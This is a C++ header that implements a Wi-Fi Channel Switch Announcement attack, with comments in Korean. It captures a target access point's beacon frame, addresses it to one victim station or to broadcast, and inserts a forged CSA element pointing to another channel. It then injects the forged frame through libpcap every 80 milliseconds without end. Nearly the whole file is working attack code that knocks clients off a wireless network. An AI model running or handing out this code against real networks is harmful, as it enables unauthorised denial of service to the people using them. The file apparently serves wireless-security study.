#ifndef CSAATTACK_H
#define CSAATTACK_H

#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <csignal>
#include <unistd.h>
#include <pcap.h>
#include <thread>
#include <chrono>

#include "mac.h"
#include "radiotap.h"
#include "beaconframe.h"
#include "fixedparam.h"
#include "tagedparam.h"

using namespace std;

class CSAAttack
{
public:
    CSAAttack(const string &iface, const string &apMacStr, const string &stationMacStr = "FF:FF:FF:FF:FF:FF")
        : iface(iface), apMac(apMacStr), stationMac(stationMacStr),
          isUnicast(stationMacStr != "FF:FF:FF:FF:FF:FF")
    {
        char errbuf[PCAP_ERRBUF_SIZE];
        handle = pcap_open_live(iface.c_str(), 1024, 1, 1000, errbuf);
        if (!handle)
        {
            cerr << "pcap_open_live failed: " << errbuf << endl;
            exit(EXIT_FAILURE);
        }
        if (pcap_datalink(handle) != DLT_IEEE802_11_RADIO)
        {
            cerr << "Not a Radiotap (802.11) interface." << endl;
            pcap_close(handle);
            exit(EXIT_FAILURE);
        }
    }

    ~CSAAttack()
    {
        if (handle)
            pcap_close(handle);
    }

    void run()
    {
        vector<uint8_t> txRadiotapBytes;
        vector<uint8_t> beaconBytes;
        RadiotapHeader rxRt;
        BeaconFrame beacon;

        // Beacon 프레임 캡처 (유효한 Beacon 프레임을 얻을 때까지)
        while (true)
        {
            struct pcap_pkthdr *header;
            const u_char *packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0)
                continue;
            if (res == -1 || res == -2)
                break;

            // Radiotap 헤더 파싱
            try
            {
                rxRt.parseBytes(packet, header->caplen);
            }
            catch (const exception &e)
            {
                continue;
            }
            size_t offset = rxRt.it_len;
            if (header->caplen < offset + 2)
                continue;
            // Beacon 프레임 확인: frameControl가 0x0080 (리틀 엔디언)이어야 함.
            uint16_t fc = packet[offset] | (packet[offset + 1] << 8);
            if (fc != 0x0080)
                continue;

            try
            {
                // FCS가 있을 경우 제거하여 파싱 시도
                beacon.parseBytes(packet + offset, header->caplen - offset);
            }
            catch (const exception &e)
            {
                if (header->caplen - offset > 4)
                {
                    try
                    {
                        beacon.parseBytes(packet + offset, header->caplen - offset - 4);
                    }
                    catch (const exception &e2)
                    {
                        continue;
                    }
                }
                else
                    continue;
            }

            // BSSID 검사: 캡처한 Beacon의 BSSID가 지정한 AP MAC과 일치하는지
            if (beacon.bssid != apMac)
                continue;

            // 목적지 주소 수정: 유니캐스트이면 stationMac, 아니면 브로드캐스트
            if (isUnicast)
                beacon.destAddress = stationMac;
            else
                beacon.destAddress = Mac("FF:FF:FF:FF:FF:FF");

            // CSA 태그 삽입
            insertCSATag(beacon);

            // 전송용 Radiotap 헤더 구성 (18바이트 헤더)
            txRadiotapBytes = constructTxRadiotapHeader(rxRt);

            beaconBytes = beacon.toBytes();
            break; // 유효한 Beacon 프레임 획득
        }

        // 최종 전송 패킷 구성: [전송용 Radiotap 헤더] + [수정된 Beacon 프레임]
        vector<uint8_t> finalPacket;
        finalPacket.insert(finalPacket.end(), txRadiotapBytes.begin(), txRadiotapBytes.end());
        // 보정: 예상보다 beaconBytes가 1바이트 길 경우 제거
        if (!beaconBytes.empty() && (txRadiotapBytes.size() + beaconBytes.size()) % 2 != 0)
        {
            beaconBytes.pop_back();
        }
        finalPacket.insert(finalPacket.end(), beaconBytes.begin(), beaconBytes.end());

        // 전송 루프
        while (true)
        {
            if (pcap_sendpacket(handle, finalPacket.data(), static_cast<int>(finalPacket.size())) != 0)
            {
                cerr << "Error sending packet: " << pcap_geterr(handle) << endl;
            }
            else
            {
                cout << "Packet sent successfully!" << endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(80));
        }
    }

private:
    string iface;
    Mac apMac;
    Mac stationMac;
    bool isUnicast;
    pcap_t *handle;

    // CSA 태그 삽입: BeaconFrame 내부의 TaggedParameters에서 IE ID 3를 찾아 채널 값을 추출한 후,
    // CSA 태그(TaggedParameter, ID 37)를 적절한 위치에 삽입함.
    void insertCSATag(BeaconFrame &beacon)
    {
        uint8_t channel = 0;
        int insertIndex = -1;
        for (size_t i = 0; i < beacon.taggedParams.parameters.size(); i++)
        {
            TaggedParameter &param = beacon.taggedParams.parameters[i];
            if (param.id == 3 && param.length == 1)
            {
                channel = param.data[0] * 2;
            }
            if (i < beacon.taggedParams.parameters.size() - 1)
            {
                if (param.id <= 0x25 && beacon.taggedParams.parameters[i + 1].id > 0x25)
                {
                    insertIndex = i + 1;
                    break;
                }
            }
        }
        if (insertIndex == -1)
            insertIndex = beacon.taggedParams.parameters.size();
        vector<uint8_t> csaData = {1, channel, 3};
        TaggedParameter csaParam(37, 3, csaData);
        beacon.taggedParams.parameters.insert(beacon.taggedParams.parameters.begin() + insertIndex, csaParam);
    }

    // constructTxRadiotapHeader() : 전송용 Radiotap 헤더를 18바이트로 직접 구성함.
    // 예상 패킷의 Radiotap 헤더 (예: "00 00 12 00 2e 48 00 00 10 02 99 09 a0 00 d9 00 00 00")
    // 와 유사하도록 구성함.
    vector<uint8_t> constructTxRadiotapHeader(const RadiotapHeader &rxRt)
    {
        vector<uint8_t> header;
        // 기본 필드: it_version, it_pad, it_len (18)
        uint8_t it_version = 0;
        uint8_t it_pad = 0;
        uint16_t it_len = 18; // 전송용 헤더 길이
        header.push_back(it_version);
        header.push_back(it_pad);
        header.push_back(it_len & 0xFF);
        header.push_back((it_len >> 8) & 0xFF);
        // present 필드: 예상 패킷에서 보이는 값 0x0000482e (little-endian)
        uint32_t present = 0x0000482e;
        header.push_back(present & 0xFF);
        header.push_back((present >> 8) & 0xFF);
        header.push_back((present >> 16) & 0xFF);
        header.push_back((present >> 24) & 0xFF);
        // 다음 필드: Data Rate (1바이트) -- rxRt.data_rate 사용 (예: 0x10)
        header.push_back(rxRt.data_rate);
        // Channel frequency (2바이트) -- rxRt.channel_freq
        header.push_back(rxRt.channel_freq & 0xFF);
        header.push_back((rxRt.channel_freq >> 8) & 0xFF);
        // Channel flags (2바이트) -- rxRt.channel_flags
        header.push_back(rxRt.channel_flags & 0xFF);
        header.push_back((rxRt.channel_flags >> 8) & 0xFF);
        // Extra field (2바이트) -- 예를 들어, 고정 값 0xd900 (expected: d9 00)
        uint16_t extra = 0xd900;
        header.push_back(extra & 0xFF);
        header.push_back((extra >> 8) & 0xFF);
        // 남은 3바이트 패딩 (0x00)로 채워 18바이트 달성
        header.push_back(0);
        header.push_back(0);
        header.push_back(0);
        return header;
    }
};

#endif // CSAATTACK_H
